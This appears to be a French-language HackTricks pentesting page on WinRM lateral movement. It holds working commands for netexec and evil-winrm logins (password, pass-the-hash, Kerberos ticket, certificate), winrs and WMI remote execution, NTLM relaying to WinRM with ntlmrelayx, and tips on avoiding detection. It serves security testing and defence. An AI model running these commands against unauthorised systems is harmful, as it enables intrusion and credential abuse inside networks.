# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM est l’un des transports de **lateral movement** les plus pratiques dans les environnements Windows, car il vous donne un shell distant via **WS-Man/HTTP(S)** sans avoir besoin d’astuces de création de service SMB. Si la cible expose **5985/5986** et que votre principal est autorisé à utiliser le remoting, vous pouvez souvent passer de « valid creds » à « interactive shell » très rapidement.

Pour l’**énumération du protocole/service**, les listeners, l’activation de WinRM, `Invoke-Command`, et l’usage générique du client, consultez :

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Utilise **HTTP/HTTPS** au lieu de SMB/RPC, donc cela fonctionne souvent là où l’exécution de type PsExec est bloquée.
- Avec **Kerberos**, cela évite d’envoyer des identifiants réutilisables à la cible.
- Fonctionne proprement depuis les outils **Windows**, **Linux**, et **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Le chemin interactif de PowerShell remoting lance **`wsmprovhost.exe`** sur la cible sous le contexte de l’utilisateur authentifié, ce qui est opérationnellement différent de l’exécution basée sur un service.

## Access model and prerequisites

En pratique, une lateral movement WinRM réussie dépend de **trois** éléments :

1. La cible a un **WinRM listener** (`5985`/`5986`) et des règles de pare-feu qui autorisent l’accès.
2. Le compte peut **s’authentifier** sur l’endpoint.
3. Le compte est autorisé à **ouvrir une session de remoting**.

Façons courantes d’obtenir cet accès :

- **Local Administrator** sur la cible.
- Appartenance à **Remote Management Users** sur les systèmes récents ou à **WinRMRemoteWMIUsers__** sur les systèmes/composants qui prennent encore en compte ce groupe.
- Droits de remoting explicitement délégués via des descripteurs de sécurité locaux / des modifications des ACL de PowerShell remoting.

Si vous contrôlez déjà une machine avec des droits admin, rappelez-vous que vous pouvez aussi **déléguer l’accès WinRM sans appartenance complète au groupe admin** en utilisant les techniques décrites ici :

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos nécessite un hostname/FQDN**. Si vous vous connectez par IP, le client bascule généralement vers **NTLM/Negotiate**.
- Dans les cas de **workgroup** ou de confiance croisée, NTLM nécessite souvent soit **HTTPS**, soit que la cible soit ajoutée à **TrustedHosts** sur le client.
- Avec des **local accounts** via Negotiate dans un workgroup, les restrictions UAC remote peuvent empêcher l’accès, sauf si le compte Administrator intégré est utilisé ou si `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting utilise par défaut le **`HTTP/<host>` SPN**. Dans les environnements où `HTTP/<host>` est déjà enregistré pour un autre compte de service, WinRM Kerberos peut échouer avec `0x80090322`; utilisez un SPN qualifié par port ou basculez vers **`WSMAN/<host>`** lorsque ce SPN existe.

Si vous obtenez des identifiants valides lors d’un password spraying, les valider via WinRM est souvent le moyen le plus rapide de vérifier s’ils donnent un shell :

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM pour des shells interactifs

`evil-winrm` reste l'option interactive la plus pratique depuis Linux car il prend en charge les **passwords**, les **NT hashes**, les **Kerberos tickets**, les **client certificates**, le transfert de fichiers et le chargement en mémoire de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Cas limite Kerberos SPN : `HTTP` vs `WSMAN`

Lorsque le SPN par défaut **`HTTP/<host>`** provoque des échecs Kerberos, essayez plutôt de demander/utiliser un ticket **`WSMAN/<host>`**. Cela apparaît dans des configurations d’entreprise durcies ou inhabituelles où `HTTP/<host>` est déjà associé à un autre compte de service.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Ceci est également utile après un abus de **RBCD / S4U** lorsque vous avez spécifiquement forgé ou demandé un ticket de service **WSMAN** plutôt qu’un ticket `HTTP` générique.

### Certificate-based authentication

WinRM prend aussi en charge l’**authentification par certificat client**, mais le certificat doit être mappé sur la cible à un **compte local**. D’un point de vue offensif, cela compte lorsque :

- vous avez déjà volé/exporté un certificat client valide et sa clé privée déjà mappés pour WinRM ;
- vous avez abusé de **AD CS / Pass-the-Certificate** pour obtenir un certificat pour un principal, puis pivoter vers un autre chemin d’authentification ;
- vous opérez dans des environnements qui évitent délibérément le remoting basé sur mot de passe.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM est beaucoup moins courant que l’authentification par password/hash/Kerberos, mais lorsqu’il existe, il peut fournir un chemin de **lateral movement sans mot de passe** qui survit à la rotation du password.

### Python / automation avec `pypsrp`

Si vous avez besoin d’automation plutôt que d’un shell opérateur, `pypsrp` fournit WinRM/PSRP depuis Python avec le support de **NTLM**, **certificate auth**, **Kerberos** et **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Mouvement latéral WinRM natif de Windows

### `winrs.exe`

`winrs.exe` est intégré et utile lorsque vous voulez une **exécution de commandes WinRM native** sans ouvrir une session PowerShell remoting interactive :
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Opérationnellement, `winrs.exe` aboutit généralement à une chaîne de processus distante similaire à :
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Ceci vaut la peine d’être retenu car cela diffère de l’exec basé sur les services et des sessions PSRP interactives.

### `winrm.cmd` / WS-Man COM au lieu de PowerShell remoting

Vous pouvez également exécuter via le **transport WinRM** sans `Enter-PSSession` en invoquant des classes WMI sur WS-Man. Cela conserve le transport comme WinRM, tandis que le primitive d’exécution distante devient **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Cette approche est utile lorsque :

- La journalisation PowerShell est fortement surveillée.
- Vous voulez le **transport WinRM** mais pas un workflow classique de PS remoting.
- Vous construisez ou utilisez des outils custom autour de l’objet COM **`WSMan.Automation`**.

## NTLM relay vers WinRM (WS-Man)

Lorsque le relay SMB est bloqué par le signing et que le relay LDAP est restreint, **WS-Man/WinRM** peut encore être une cible de relay intéressante. Les versions modernes de `ntlmrelayx.py` incluent des **serveurs de relay WinRM** et peuvent relayer vers des cibles **`wsman://`** ou **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Deux notes pratiques :

- Relay est surtout utile lorsque la cible accepte **NTLM** et que le principal relayé est autorisé à utiliser WinRM.
- Le code récent d’Impacket gère spécifiquement les requêtes **`WSMANIDENTIFY: unauthenticated`** afin que les probes de type `Test-WSMan` ne cassent pas le flux de relay.

Pour les contraintes de multi-hop après avoir obtenu une première session WinRM, consulte :

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notes OPSEC et détection

- Le remoting PowerShell interactif crée généralement **`wsmprovhost.exe`** sur la cible.
- **`winrs.exe`** crée souvent **`winrshost.exe`**, puis le processus enfant demandé.
- Attends-toi à de la télémétrie de **network logon**, des événements du service WinRM, et du logging PowerShell operational/script-block si tu utilises PSRP plutôt que `cmd.exe` brut.
- Si tu n’as besoin que d’une seule commande, `winrs.exe` ou une exécution WinRM en une seule fois peut être plus discret qu’une session de remoting interactive longue durée.
- Si Kerberos est disponible, préfère **FQDN + Kerberos** plutôt que IP + NTLM afin de réduire à la fois les problèmes de confiance et les changements délicats côté client dans `TrustedHosts`.

## Références

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
